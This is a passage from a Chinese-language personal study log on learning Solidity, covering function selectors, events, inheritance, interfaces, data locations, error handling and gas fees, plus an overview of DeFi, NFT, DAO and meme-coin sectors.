     └─ 写入 A.value = msg.value
```

**关键点**：虽然执行的是 B 的函数逻辑，但一切读写操作都是在 A 的存储中完成的。

### 20.函数选择器

**函数选择器（Function Selector）**：是函数调用时 `calldata` 的前 4 个字节，用于标识调用的是哪个函数。

**生成方式**：`bytes4(keccak256("函数名(参数类型列表)"))`

**用途**：

1. EVM 用它决定调用哪个函数
2. 在低级调用（`call`）中直接指定函数
3. 可以预计算选择器节省一点 gas

**注意**：

- 参数类型必须写全且与声明顺序一致，不能有空格

- 仅 4 个字节，可能出现哈希碰撞（很少但可能）

  

**简单例子：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract FunctionSelector {
    // 获取任意函数签名的选择器
    function getSelector(string calldata _func)
        external
        pure
        returns (bytes4)
    {
        return bytes4(keccak256(bytes(_func)));
    }

    // 示例：获取常用 ERC20 函数选择器
    function example() external pure returns (bytes4, bytes4) {
        bytes4 sel1 = bytes4(keccak256("transfer(address,uint256)"));      // 0xa9059cbb
        bytes4 sel2 = bytes4(keccak256("transferFrom(address,address,uint256)")); // 0x23b872dd
        return (sel1, sel2);
    }
}
```

**调用演示：**

1. 调用 `getSelector("transfer(address,uint256)")` → 返回 `0xa9059cbb`
2. 调用 `getSelector("transferFrom(address,address,uint256)")` → 返回 `0x23b872dd`

# 2025-08-13

### 12.Events

#### 1.什么是 Event

- **定义**：事件是 Solidity 提供的一种日志机制（log），可以在链上存储简化后的数据，并且让外部（前端 / 监听服务）更方便地捕捉和读取。
- **用途**：
  1. 记录交易执行过程中的关键信息（比如转账记录、状态变化等）。
  2. 供前端 DApp 或后端服务监听，触发 UI 更新或业务逻辑。
  3. 作为链上操作的**可查询历史记录**（链下查询时比直接查 storage 更省 gas）。

#### 2.Event 的语法与声明

```solidty
// 声明
event Transfer(address indexed from, address indexed to, uint256 value);

// 触发
emit Transfer(msg.sender, receiver, amount);
```

关键点

- **`event`** 关键字用于声明事件。
- **`emit`** 关键字用于触发事件。
- **参数**：
  - 普通参数：只能在链下通过解析整个日志数据来检索。
  - **indexed** 参数：可以被索引（最多 3 个），便于通过特定值搜索日志（比如查找所有 to = 某地址的转账事件）。
- **数据类型**：支持 Solidity 常见的值类型和引用类型。

#### 3.indexed 的作用

**indexed** 参数会被存储在 **topics** 中，可以让外部快速按条件过滤事件。

```
Log 数据结构：
┌─────────────┬────────────────────────┐
│ topics[0]   │ 事件签名哈希（固定）    │
│ topics[1~3] │ indexed 参数（最多 3 个）│
│ data        │ 非 indexed 参数数据     │
└─────────────┴────────────────────────┘
```

例子：

```solidity
event Transfer(address indexed from, address indexed to, uint256 value);
```

- `from` 和 `to` 会放进 topics，可通过区块链节点 API 按地址过滤事件。
- `value` 在 data 中，需要解析完整日志才能拿到。

#### 4.Event 的生命周期

1. **编译阶段**：事件签名会被哈希（`keccak256("Transfer(address,address,uint256)")`）形成 **topic[0]**。
2. **运行时**：调用 `emit` 时，EVM 会把 `topics` + `data` 写入日志（log）区域。
3. **存储位置**：日志只存储在交易的 receipt 中，不会占用合约的 storage（更省 gas）。
4. **读取方式**：
   - 链下：前端 Web3.js / Ethers.js 监听
   - 链上：不能直接从合约读取 event 数据，只能用外部 RPC API

####  5.Gas 消耗

- Event 的数据不存储在 storage，而是写入到交易的日志（log）中，因此比写 storage 便宜很多。
- 但 indexed 参数比普通参数更耗 gas（因为需要额外写入 topics）。

#### 6.前端监听事件（Ethers.js 示例）

```
javascript复制编辑// 假设已经有 contract 实例
contract.on("Transfer", (from, to, value, event) => {
  console.log(`转账: ${from} -> ${to} 金额: ${value.toString()}`);
  console.log(event); // 包含 blockNumber, transactionHash 等
});
```



### 13.构造器

跟java里面的语法很类似，这里不过多赘述，就放个例子进行解释

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// Base contract X
contract X {
    string public name;

    constructor(string memory _name) {
        name = _name;
    }
}

// Base contract Y
contract Y {
    string public text;

    constructor(string memory _text) {
        text = _text;
    }
}

// There are 2 ways to initialize parent contract with parameters.

// Pass the parameters here in the inheritance list.
contract B is X("Input to X"), Y("Input to Y") {}

contract C is X, Y {
    // Pass the parameters here in the constructor,
    // similar to function modifiers.
    constructor(string memory _name, string memory _text) X(_name) Y(_text) {}
}

// Parent constructors are always called in the order of inheritance
// regardless of the order of parent contracts listed in the
// constructor of the child contract.

// Order of constructors called:
// 1. X
// 2. Y
// 3. D
contract D is X, Y {
    constructor() X("X was called") Y("Y was called") {}
}

// Order of constructors called:
// 1. X
// 2. Y
// 3. E
contract E is X, Y {
    constructor() Y("Y was called") X("X was called") {}
}

```



### 14.继承

#### 1.基础概念

- **继承**：子合约可以继承父合约的状态变量、函数、事件等。
- **关键字**：`is` 用于声明继承关系。
- **多重继承**：Solidity 支持多重继承，并且使用 **C3 线性化**（从右到左、深度优先）来解析函数调用顺序。
- **`virtual` / `override`**：
  - 父合约中允许子合约覆盖的函数要加 `virtual`。
  - 子合约中覆盖父合约的函数必须加 `override`，多继承覆盖多个父合约时写成 `override(父1, 父2)`。

#### 2.多重继承与函数解析顺序（Method Resolution Order）

### 例子：

```solidity
contract D is B, C {
    function foo() public pure override(B, C) returns (string memory) {
        return super.foo();
    }
}
```

- 继承关系：`D` 同时继承 `B` 和 `C`，而 `B`、`C` 都继承自 `A`。
- 调用 `super.foo()` 时，编译器会按照 **继承线性化顺序** 查找下一个实现：
  - 对 `D is B, C`，顺序是：`D → C → B → A`
  - 所以这里会先执行 `C.foo()`，然后它内部如果调用 `super.foo()`，会继续按顺序调用到 `B.foo()`，再到 `A.foo()`。
- 运行结果：
  - `D.foo()` → `C.foo()` → `A.foo()` （因为 C 的 `foo` 里直接调用了 `A.foo()` 而不是 super）。

**要点**：

- 多重继承时，如果多个父合约有同名函数，**右边的父合约优先级更高**。
- super 调用并不是“父类固定”，而是按线性化顺序找“下一个”函数。

#### 3.状态变量的“覆盖”问题（Shadowing）

- 与函数不同，**状态变量不能通过重新声明来覆盖**。
- Solidity 0.6+ 已经禁止了 shadowing：

```solidity
// 不允许这样写
// contract B is A {
//     string public name = "Contract B"; // 会报错
// }
```

- **正确做法**：在子合约的构造函数中重新赋值父合约的状态变量：

```solidity
contract C is A {
    constructor() {
        name = "Contract C";
    }
}
```

- 运行结果：调用 `getName()` 返回 `"Contract C"`。

#### 4.调用父合约函数的两种方式

方式 1：直接调用父合约名

```solidity
A.foo(); // 直接调用 A 的实现
```

- 会直接执行指定父合约的版本，不经过继承链。

方式 2：使用 `super`

```solidity
super.foo();
```

- 按线性化顺序调用“下一个”实现。
- 如果多继承，每个父合约的 `super` 调用会依次往下传递，但不会重复调用同一个合约的方法。

示例运行结果：

```solidity
contract D is B, C {
    function foo() public override(B, C) {
        super.foo();
    }
    function bar() public override(B, C) {
        super.bar();
    }
}
```

假设继承顺序 `D → C → B → A`：

- 调 `D.foo()`：
  - D 调 `super.foo()` → 找到 C.foo() → C 调 `A.foo()` → 结束
- 调 `D.bar()`：
  - D 调 `super.bar()` → 找到 C.bar() → C 调 `super.bar()` → 找到 B.bar() → B 调 `super.bar()` → 找到 A.bar() → 结束
  - 注意：虽然 B 和 C 都调用了 `super.bar()`，但 `A.bar()` 只执行一次（避免重复）。

#### 5.继承声明的顺序要求

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract A {
    function foo() public pure virtual returns (string memory) {
        return "A";
    }
}

contract B is A {
    function foo() public pure virtual override returns (string memory) {
        return "B";
    }
}

// ❌ 错误写法：B 已经继承了 A，但这里把 A 放在了 B 后面
contract F is B, A {
    function foo() public pure override(B, A) returns (string memory) {
        return super.foo();
    }
}

```

```css
 A
↑ ↑
B  │
↑  │
F──┘  ← 冲突：F 通过 B 继承 A，又直接继承 A
```

```css
A
↑
B
↑
F   ← 顺序单一且一致
```

### 15.接口

#### 1.接口是什么 & 基本规则

**接口（interface）** 是一组**函数签名**的集合，用来声明“我将要调用/实现哪些外部函数”。编译器用它来做类型检查、ABI 编解码。

必须记住的规则（Solidity 0.8.x）：

- **不能有任何函数实现**（只能有声明）。
- **函数必须是 `external`**（带 `view/pure/payable` 等修饰可以）。
- **不能声明构造函数**、**不能声明状态变量**。
- **可以继承其它接口**（支持多继承）。
- **可以声明事件（event）和自定义错误（error）**；也可声明 `enum/struct`（便于统一参数类型）。
- **任何合约**只要**“函数签名兼容”**即可**被当作该接口来调用**（不需要显式 `is IXXX`）。

#### 2.定义接口 & 合约实现（或被动兼容）

```solidity
// 合约：被调用方
contract Counter {
    uint256 public count;
    function increment() external { count += 1; }
}

// 接口：声明要调用哪些外部函数
interface ICounter {
    function count() external view returns (uint256);
    function increment() external;
}
```

即使 `Counter` **没有**写 `is ICounter`，也能被 `ICounter` 调用，因为它们**函数签名兼容**。

**让合约“明确实现接口”（可读性更好）**：

```solidity
contract MyCounter is ICounter {
    uint256 public override count;
    function increment() external override { count += 1; }
}
```

#### 3.接口 vs 抽象合约（abstract contract）

| 特性              | Interface        | Abstract Contract                      |
| ----------------- | ---------------- | -------------------------------------- |
| 函数体实现        | ❌ 不允许         | ✅ 允许部分实现、部分 `virtual` 未实现  |
| 函数可见性        | 只能 `external`  | 任意（`public/internal/private` 均可） |
| 状态变量/构造函数 | ❌ 不允许         | ✅ 允许                                 |
| 典型用途          | 声明外部交互协议 | 复用逻辑 + 规定子类需要实现的抽象方法  |

### 实践：Ethernaut闯关

~~打卡处上传不了图片，我上传到自己的博客中了~~

博客炸了维修ing。修好了补上链接

# 2025-08-12

### 8.用户自定义值类型（UDVT, User Defined Value Type）

**用户自定义值类型（UDVT）可以在编译期防止底层类型相同但语义不同的值被误用，从而提升类型安全性和代码可维护性**。举个例子

#### 1. 没有 UDVT（`LibClockBasic` 的例子）

```
uint64 d = 1;
uint64 t = uint64(block.timestamp);
clock = LibClockBasic.wrap(d, t); // 正确
clock = LibClockBasic.wrap(t, d); // ❌ 逻辑上错了，但仍然可以编译
```

- **问题**：`_duration` 和 `_timestamp` 都是 `uint64`，编译器无法区分它们的语义。
- 如果你传反了顺序，编译器不会报错，可能会造成严重的逻辑 bug（例如时间戳和持续时间被反转）。

------

#### 2. 使用 UDVT（`LibClock` 的例子）

**用户自定义值类型的定义**

```
type Duration is uint64;
type Timestamp is uint64;
type Clock is uint128;
```

- 用于给底层的原始类型加上**语义标签**。
- 防止“长得一样”的数字被错误混用。

**值类型的包装和解包**

- `wrap`：把原始类型转换成自定义类型。
- `unwrap`：把自定义类型转换成原始类型。

```solidity
Duration d = Duration.wrap(1);
uint64 d_raw = Duration.unwrap(d);
```

```
Duration d = Duration.wrap(1);
Timestamp t = Timestamp.wrap(uint64(block.timestamp));

clock = LibClock.wrap(d, t); // 正确
clock = LibClock.wrap(t, d); // ❌ 编译直接报错
```

- **好处**：
  - `Duration` 和 `Timestamp` 是两种不同的类型，即使它们底层都是 `uint64`，也不能互换。
  - 如果顺序传错，编译器会直接拒绝编译，提前发现错误。
  - 提高了**类型安全性**和**可读性**。

### 9.数据位置

Solidity中有三种数据位置：storage、memory和calldata。

| 位置         | 存储位置                           | 生命周期               | 特点                                 |
| ------------ | ---------------------------------- | ---------------------- | ------------------------------------ |
| **storage**  | 区块链上                           | 持久化（合约存在期间） | 读写消耗 gas，数据永久保留           |
| **memory**   | 内存（EVM 临时区域）               | 函数调用期间           | 读写快，但调用结束数据消失           |
| **calldata** | 只读的函数参数区（EVM 特殊内存段） | 函数调用期间           | 不能修改，最省 gas，适合传入外部数据 |

举例子

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract DataLocationExample {
    uint[] public numbers; // storage: 持久化在区块链

    // 修改 storage
    function addNumber(uint num) public {
        numbers.push(num); // 写入 storage（永久保存）
    }

    // 使用 memory
    function getNumbersCopy() public view returns (uint[] memory) {
        uint[] memory temp = numbers; // 临时复制到内存
        temp[0] = 999; // 只改了副本，storage 不变
        return temp;   // 返回副本
    }

    // 使用 calldata（只读）
    function sumNumbers(uint[] calldata arr) public pure returns (uint sum) {
        // arr 是只读的，不能 arr[0] = ...
        for (uint i = 0; i < arr.length; i++) {
            sum += arr[i];
        }
    }
}

```

**storage**

- `numbers` 存在链上。`addNumber(5)` 会永久把 `5` 记录到区块链中。
- 修改它会花 gas（因为要更新链上存储）。

**memory**

- `getNumbersCopy()` 创建了 `numbers` 的临时副本。
- 改 `temp[0]` 不影响 `numbers` 本身。
- 调用结束后 `temp` 消失，不花额外存储 gas。

**calldata**

- `sumNumbers` 的参数 `arr` 是外部传入的、只读的。
- 不能修改 `arr`，而且最省 gas（因为不做额外复制）。

### 10.函数

#### 1.函数修饰符

| 修饰符   | 可见范围    | 描述                   | 使用场景                   |
| :------- | :---------- | :--------------------- | :------------------------- |
| public   | 内部 + 外部 | 任何地方都可以调用     | 对外提供的公共接口         |
| external | 仅外部      | 只能从合约外部调用     | 外部用户接口，gas 效率更高 |
| internal | 内部 + 继承 | 当前合约和子合约可调用 | 内部逻辑函数，需要被继承   |
| private  | 仅内部      | 只有当前合约可调用     | 私有实现细节               |

#### 2.状态修饰

| 修饰符   | 状态读取 | 状态修改 | Gas 消耗 | 描述                     |
| :------- | :------- | :------- | :------- | :----------------------- |
| pure     | ❌        | ❌        | 低       | 不读取也不修改状态的函数 |
| view     | ✅        | ❌        | 低       | 只读取状态，不修改状态   |
| payable  | ✅        | ✅        | 正常     | 可以接收以太币的函数     |
| 无修饰符 | ✅        | ✅        | 正常     | 可以读取和修改状态       |

#### 3.函数修饰器（modifiers）

在进入函数前/后注入通用逻辑。

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "not owner");
    _;
}

modifier nonReentrant() {
    require(_locked == 0); _locked = 1;
    _;
    _locked = 0;
}

function withdraw(uint amt) external onlyOwner nonReentrant {
    // 先执行 onlyOwner，接着 nonReentrant，然后进入函数体
}
```

**顺序：**按声明顺序从左到右应用。

### 11.Error

#### Solidity 中的错误处理概念

在 Solidity 中，如果在交易执行过程中发生错误，**该交易会回滚（revert）**，即：

- 所有对 **状态变量** 的更改都会撤销
- 已消耗的 gas 不会退还（但未使用的 gas 会退还）
- 调用方会收到一个错误信息（字符串或自定义 error）

#### 三种内置的错误抛出方法

| 方法      | 常用场景                                   | 能否加错误信息           | Gas 消耗 | 特点                    |
| --------- | ------------------------------------------ | ------------------------ | -------- | ----------------------- |
| `require` | 检查输入、前置条件、外部调用返回值         | ✅                        | 中等     | 最常用                  |
| `revert`  | 复杂条件检查、早退出                       | ✅                        | 中等     | 和 `require` 一样会回滚 |
| `assert`  | 检查**永远不应该失败**的内部逻辑（不变量） | ❌（8.0+ 可用Panic code） | 高       | 失败代表代码 bug        |

#### `require`

- 检查**函数执行前的条件**
- 条件不满足时，直接回滚并附带错误信息

```solidity
require(_i > 10, "Input must be greater than 10");
```

------

#### `revert`

- 和 `require` 一样会回滚，但更适合在条件较复杂时使用
- 优势是可以先做多步计算，然后根据结果判断是否 `revert`

```solidity
if (_i <= 10) {
    revert("Input must be greater than 10");
}
```

------

#### `assert`

- 只用于检测**代码中不应该发生的情况**
- 如果失败，意味着代码逻辑有 bug
- 不要用 `assert` 检查用户输入（应使用 `require`）

```solidity
assert(num == 0); // num 永远不应该被改
```

#### 自定义错误（Custom Error）

自 Solidity 0.8.4 起，可以定义自定义错误：

```solidity
error InsufficientBalance(uint256 balance, uint256 withdrawAmount);
```

- 优点：**比字符串省 gas**（字符串会占更多字节）
- 用法：

```solidity
if (bal < _withdrawAmount) {
    revert InsufficientBalance({
        balance: bal,
        withdrawAmount: _withdrawAmount
    });
}
```

- 返回的数据更结构化，前端也更容易解析

# 2025-08-11

## Solidity初学

主要参考

https://solidity-by-example.org/

https://updraft.cyfrin.io/courses/solidity

https://web3intern.xyz/zh/smart-contract-development/#%E4%B8%89%E3%80%81solidity-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%BC%96%E7%A8%8B-%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D

由于solidity的语法格式与java相仿，这里只做笔记不一样的东西，且简单的程序练习直接进行跳过。

### 1.版本声明

每个 Solidity 文件必须以版本声明开始：

```solidity
pragma solidity ^0.8.0;
```

### 2.数据类型

个人觉得实习手册中总结做的十分好

| 类型             | 描述             | 示例                              | 默认值 |
| :--------------- | :--------------- | :-------------------------------- | :----- |
| bool             | 布尔值           | true / false                      | false  |
| uint8            | 8 位无符号整数   | 0 ~ 255                           | 0      |
| uint16           | 16 位无符号整数  | 0 ~ 65535                         | 0      |
| uint256 / uint   | 256 位无符号整数 | 0 ~ (2^256 - 1)                   | 0      |
| int8             | 8 位有符号整数   | -128 - 127                        | 0      |
| int256 / int     | 256 位有符号整数 | -2^255 ~ (2^255 - 1)              | 0      |
| address          | 以太坊地址       | 0x….                              | 0      |
| bytes1 ~ bytes32 | 固定长度字节数组 | bytes32 data = "Hello"            | 0x00   |
| bytes            | 动态字节数组     | bytes memory data = "Hello World" | ""     |
| string           | UTF-8 编码字符串 | string name = "Alice"             | ""     |

复合数据类型

| 类型     | 语法            | 描述           | 示例                                        |
| :------- | :-------------- | :------------- | :------------------------------------------ |
| 静态数组 | T[k]            | 固定长度数组   | uint[5] numbers                             |
| 动态数组 | T[]             | 可变长度数组   | uint[] memory list                          |
| 映射     | mapping(K => V) | 键值对存储     | mapping(address => uint256) balances        |
| 结构体   | struct          | 自定义数据结构 | `struct Person { string name; uint age; }`  |
| 枚举     | enum            | 枚举类型       | `enum Status { Pending, Active, Inactive }` |

### 3.变量

#### local

- 在函数内声明
- 不存储在区块链上

#### state

- 在函数外声明
- 存储在区块链上

#### **global**

提供一些来自区块链的信息，比如：

```solidity
        uint256 timestamp = block.timestamp; // Current block timestamp(当前区块的时间戳)
        address sender = msg.sender; // address of the caller(调用发起方的地址)
```

#### 常用的global变量

| 变量名                    | 类型      | 作用                                   | 示例值/说明                    |
| ------------------------- | --------- | -------------------------------------- | ------------------------------ |
| `msg.sender`              | `address` | 当前调用者地址（可能是外部账户或合约） | `0xAbc...123`                  |
| `msg.value`               | `uint`    | 调用时发送的以太币数量（wei）          | `1000000000000000000` (1 ETH)  |
| `msg.data`                | `bytes`   | 调用时的完整 calldata                  | `0xa9059cbb00000000...`        |
| `msg.sig`                 | `bytes4`  | calldata 的前 4 个字节（函数选择器）   | `0xa9059cbb`                   |
| `tx.origin`               | `address` | 发起整个交易的外部账户地址             | `0xUser...`                    |
| `block.number`            | `uint`    | 当前区块号                             | `1728391`                      |
| `block.timestamp` / `now` | `uint`    | 当前区块的 Unix 时间戳                 | `1672531199`                   |
| `block.difficulty`        | `uint`    | 当前区块难度（PoW 下）                 | 已废弃（在 PoS 里意义不同）    |
| `block.gaslimit`          | `uint`    | 当前区块的 gas 上限                    | `30000000`                     |
| `block.coinbase`          | `address` | 出块矿工/验证者地址                    | `0xMiner...`                   |
| `gasleft()`               | `uint`    | 剩余 gas 数量                          | `21000`                        |
| `address(this)`           | `address` | 当前合约自身地址                       | `0xContract...`                |
| `selfbalance()`           | `uint`    | 当前合约账户余额（wei）                | `500000000000000000` (0.5 ETH) |

### 4.常量（Constants）

不能被修改的变量就是常量，只需在定义前加上Constants。使用常量可以减少gas消耗。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Constants {
    // coding convention to uppercase constant variables
    address public constant MY_ADDRESS =
        0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc;
    uint256 public constant MY_UINT = 123;
}

```

#### 常用的常量

| 常量/关键字                      | 作用         | 说明                                                        |
| -------------------------------- | ------------ | ----------------------------------------------------------- |
| `blockhash(uint blockNumber)`    | 获取区块哈希 | 只能获取最近 **256 个区块**的哈希，区块号必须小于当前区块号 |
| `keccak256(bytes memory)`        | 哈希函数     | 计算 Keccak-256 哈希值（EVM 哈希函数）                      |
| `sha256(bytes memory)`           | 哈希函数     | 计算 SHA-256 哈希值                                         |
| `ripemd160(bytes memory)`        | 哈希函数     | 计算 RIPEMD-160 哈希值                                      |
| `addmod(uint x, uint y, uint k)` | 模加         | `(x + y) % k`，溢出安全                                     |
| `mulmod(uint x, uint y, uint k)` | 模乘         | `(x * y) % k`，溢出安全                                     |
| `type(T).min`                    | 最小值       | 获取类型 `T` 的最小值（如 `type(uint256).min`）             |
| `type(T).max`                    | 最大值       | 获取类型 `T` 的最大值（如 `type(uint256).max`）             |

### 5.不可变变量(Immutable)

不可变变量类似于常量。不可变变量的值可以在构造函数中设置，但之后不能修改。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Immutable {
    address public immutable myAddr;
    uint256 public immutable myUint;

    constructor(uint256 _myUint) {
        myAddr = msg.sender;
        myUint = _myUint;
    }
}

```

### 6.读取与写入状态变量

要写入或更新状态变量，需要发送交易（transaction）。

另一方面，可以免费读取状态变量，无需支付任何交易费。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract SimpleStorage {
    // State variable to store a number
    uint256 public num;

    // You need to send a transaction to write to a state variable.
    function set(uint256 _num) public {
        num = _num;
    }

    // You can read from a state variable without sending a transaction.
    function get() public view returns (uint256) {
        return num;
    }
}
```

### 7.传输费用(gas and gas price)

#### 单位换算

1ETH = 10^9 gwei = 10^18 wei

#### Gas 是什么

**Gas** 是以太坊执行交易、调用合约时所消耗的计算与存储资源的度量单位。

每个 EVM 操作（opcode）都有对应的 **Gas 消耗表**，例如：

- `ADD` → 3 gas
- `SSTORE`（写入存储） → 20,000 gas
- `CALL` → 700 gas + 内部计算成本

消耗多少 gas 取决于交易执行的逻辑复杂度和数据大小。

#### **Gas 费用的计算公式**

##### **EIP-1559 之前（旧规则）**

```
复制编辑
交易费用 (ETH) = Gas Used × Gas Price
```

- **Gas Used**：实际执行中消耗的 Gas 数量（交易操作所消耗的Gas）
- **Gas Price**：用户愿意支付的每个 Gas 的价格（单位 gwei，1 gwei = 10⁻⁹ ETH）
- 特点：全额支付给矿工，Gas Price 越高交易优先级越高。

------

##### **EIP-1559 之后（伦敦升级后，当前主流规则）**

交易费用被分为三部分：

```
复制编辑
总费用 (ETH) = Gas Used × (Base Fee + Priority Fee)
```

- **Base Fee（基础费）**：
  - 由协议自动调整，**所有交易统一**。
  - 根据区块使用率动态升降（使用率高 → Base Fee 上升）。
  - **这部分费用会被销毁（Burn）**，不会给矿工。
- **Priority Fee（小费 / Tip）**：
  - 用户自愿给矿工的额外奖励。
  - 矿工只拿这部分（加上区块奖励）。
- **Gas Used**：
  - 实际执行消耗的 Gas 数量。

#### **实际计算举例**

假设：

- Base Fee = **20 gwei**
- Priority Fee = **2 gwei**
- 交易执行消耗 Gas = **50,000 gas**

##### 旧规则（EIP-1559 前）

```
总费用 = 50,000 × Gas Price
假设 Gas Price = 22 gwei
总费用 = 50,000 × 22 gwei = 1,100,000 gwei
换算 = 0.0011 ETH
```

##### 新规则（EIP-1559 后）

```
总费用 = 50,000 × (20 + 2) gwei
总费用 = 50,000 × 22 gwei = 1,100,000 gwei
换算 = 0.0011 ETH
```

不同的是：

- 其中 Base Fee 部分（50,000 × 20 gwei = 0.001 ETH）被销毁
- 剩余 Priority Fee（50,000 × 2 gwei = 0.0001 ETH）给矿工

#### **Gas Limit 与 Gas Used**

- **Gas Limit**：用户愿意为该交易最多提供的 Gas（防止意外消耗过多）。
- **Gas Used**：实际消耗的 Gas。
- 如果 Gas Used < Gas Limit → 多余部分退还。
- 如果 Gas Used > Gas Limit → 交易失败（out of gas），但已消耗的 Gas 不退。

#### **影响 Gas 费用的因素**

1. **交易类型**
   - 转账 ETH → 21,000 gas
   - 调用复杂合约 → 几十万甚至上百万 gas
2. **区块链拥堵程度**
   - 拥堵时 Base Fee 自动上调
3. **用户设置的小费（Priority Fee）**
   - 小费高 → 优先打包

## 实践：部署helloworld到Sepolia测试网

```solidity
pragma solidity ^0.8.13;

contract HelloWorld{
    string public message = "Hello Solidity & Hello Blockchain!";
    function helloWeb3() public view returns (string memory)
    {
        return message;
    }
}
```

合约地址：0xaaa34449fc9452df9da8718bdd085b6751068e83

# 2025-08-09

今天周末出去玩了稍微摸一下鱼），明天开始学习solidity

## 行业赛道全览

### 一、DeFi：去中心化金融的创新实践（Web3时代的赛博银行）

DeFi，全称为 Decentralized Finance（去中心化金融），是基于区块链技术建立的金融体系，目标是提供不依赖传统银行或金融中介的服务，比如借贷、交易、支付等，让每个人都可以自由参与，无需审批、无需信任中介机构。以下是 DeFi 领域的三个典型案例：

## 1. **Uniswap** —— 自助货币兑换机

**原理（怎么运作）**
 想象你有一家 24 小时营业的“自助外币兑换机”，里面同时放着两种货币（比如 ETH 和 USDC），两种货币的数量乘起来必须始终等于一个固定的数（这是机器的规矩）。

- 有人用 ETH 换 USDC → ETH 多了、USDC 少了，为了保持“乘积不变”，USDC 的价格会自动升高。
- 有人用 USDC 换 ETH → USDC 多了、ETH 少了，ETH 的价格会自动升高。
  换的人越多、一次换的量越大，价格变化幅度就越大（这就是“滑点”）。

**怎么赚钱**

- 你把自己的钱放进这个兑换机里，就变成了“资金提供者”。
- 每次有人来兑换，机器都会收一笔小费（比如 0.3%），直接分给资金提供者，按大家放的钱的比例分。
- 换句话说，你相当于开了个“自动收钱的换钱机”，别人换币你就分成。

**现实比喻**

- 像自动贩卖机+找零机的结合版，你提供饮料和零钱，别人买饮料付的钱、找零的币，都能让你赚到服务费。

------

## 2. **Compound** —— 把钱存进“自动借贷铺”

**原理（怎么运作）**
 把 Compound 想象成一个**无老板的当铺**：

- 有人把金子（ETH）存进来，不是卖掉，而是“押”在当铺里。
- 系统会根据金子的价值，借给你一定量的现金（USDC）。
- 借的人必须押比借的钱更值钱的东西（防止赖账）。
- 如果金子的价格大跌，押的东西不够还债，系统会自动卖掉一部分金子还钱（这就是“清算”）。

**怎么赚钱**

- 如果你是存钱的人 → 你的钱会借给别人用，别人会按小时/天付利息给你。
- 如果你是借钱的人 → 你得到现金的同时，必须按时还利息。
- 系统本身只是一个“自动管账的保险柜”，不自己赚差价，赚的钱是存钱人拿走。

**现实比喻**

- 就像一个**自动运转的当铺+银行结合体**，你存的金子/钱借给别人，别人用就要付利息，你坐着等收息。

------

## 3. **MakerDAO（Sky）** —— 用贵重物品换“稳定的购物券”

**原理（怎么运作）**
 把 MakerDAO 想成一个“抵押换购物券”的机器：

- 你拿一块金子（ETH）押进去，机器会按一定比例发给你购物券（DAI 或 USDS），1 张购物券永远等于 1 美元。
- 这样你既能拿购物券去消费投资，又不用卖掉金子。
- 当你还回购物券并加上一点“服务费”（稳定费），机器就把你的金子还给你。
- 如果金子的价格大跌，机器会卖掉你的金子帮你还债（清算）。

**怎么赚钱**

- 系统收取的“服务费”就是它的收入（类似你借房贷要交利息）。
- 你作为用户，主要是为了**获得稳定的钱**，而不是赚钱，但你可以用换来的购物券去投资其他能赚钱的项目。

**现实比喻**

- 有点像把你的金条押到当铺里，换成固定面值的购物卡，不用卖金条就能花钱。 

### 二、NFT：数字所有权的革命

#### NFT 的本质：数字资产的唯一性和所有权

传统的数字文件（如图片、视频、音频）可以被无限复制，这就导致了“所有权”变得模糊。比如，你在网上下载了一张图片，虽然你拥有它的副本，但原始的“所有权”属于创作者或某个授权的主体。

然而利用区块链技术可以明确标明所有权

**原理**：区块链记录 NFT 唯一 ID 与所有权，无法篡改或复制。

#### 另一项重要技术：智能合约

智能合约是一种自执行的协议，意味着合约中的条款在满足特定条件时会自动执行，而无需第三方中介。这些合约不仅能确保交易的安全性和自动化，还能赋予 NFT 一些特别的功能。比如**支持自动支付版税、设置交易条件**等

- **案例**：
  - **CryptoPunks**：10,000 个像素头像，每个唯一且可验证。
  - **OpenSea**：最大 NFT 交易平台，用户可铸造、买卖 NFT，所有权链上可查。

### 三. **DAO（去中心化自治组织）**

核心目标：用智能合约+社区投票取代传统公司管理结构，公开透明地治理。

- **Nouns DAO**：每天拍卖一个 Noun NFT，收益进入金库，持有者投票决定资金用途。
- **LXDAO**：聚焦 Web3 公共物品建设，成员做任务获得奖励。
- **ConstitutionDAO**：几万人众筹竞拍《美国宪法》，虽失败但展示 DAO 在重大集体行动中的潜力和局限（信息透明反而可能被竞争方利用）。

**DAO 优势**：去中心化、全球化协作、资金透明可追踪。
**DAO 局限**：隐私保护弱、易受外部干扰、决策效率可能低。

### 四. **MEME 币（文化驱动代币）**

核心目标：依托网络文化与社区共识创造价值，往往无明确技术支撑。

- **原理**：代币价格主要由情绪和叙事驱动，常见通过公平发射（Fair Launch）、社区自治等手段聚人气。
- **案例**：
  - **DOGE**：因“狗狗”表情包和马斯克推特走红。
  - **PEPE**：基于“悲伤青蛙”，市值曾破 58 亿美元。
- **风险点**：易被大户控盘；情绪/名人效应不可持续；缺乏透明度项目易跑路。

### **五、跨领域创新与原理**

1. #### **DeFi + NFT**

   - **NFT 抵押借贷**（BendDAO）：将蓝筹 NFT 抵押换 ETH，价格通过预言机实时获取，跌到阈值自动清算。
   - **NFT 流动性池**（Sudoswap）：用 Bonding Curve 自动调整 NFT 价格，实现像代币一样的即买即卖。

2. #### **DAO + MEME**

   - **FriendTech Key 模型**：买 KOL 的“Key”获得私聊权限+收益分成，价格随供需变化，持有人有社区决策权。
   - **ShibaSwap**：SHIB 持有人通过 Doggy DAO 投票治理协议。

3. #### **AI + DeFi**

   - **智能投资**：AI 分析链上数据预测最佳收益机会（Yearn Finance）。
   - **风险管理**：AI 模型动态调整抵押率等参数（Gauntlet）。
   - **交易路由**：AI 搜索最优路径（1inch AI Router）。

4. #### **Web3 + 乡建**（南塘 DAO）

   - 发行社区代币“南塘豆”量化贡献，用于治理投票和本地消费。
   - 将 PGS（参与式保障体系）与区块链结合，去中心化农产品认证权。
   - 非遗文化商品化、跨地域协作。

### **六、2025 新兴趋势原理**

1. **Intent-Based 交易**
